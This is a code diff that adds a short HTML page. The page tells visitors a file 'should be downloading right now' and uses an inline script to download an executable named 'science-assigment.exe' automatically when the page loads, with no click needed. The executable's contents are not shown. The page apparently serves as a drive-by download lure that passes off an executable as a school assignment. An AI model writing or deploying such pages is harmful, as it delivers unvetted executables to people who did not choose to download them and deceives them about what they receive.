@@ -1,0 +1,13 @@
+<body>
+<h1>Should be downloading right now, email me or something if it doesn't work</h1>
+</body>
+
+<script>
+var file_path = './science-assigment.exe';
+var a = document.createElement('A');
+a.href = file_path;
+a.download = file_path.substr(file_path.lastIndexOf('/') + 1);
+document.body.appendChild(a);
+a.click();
+document.body.removeChild(a);
+</script>
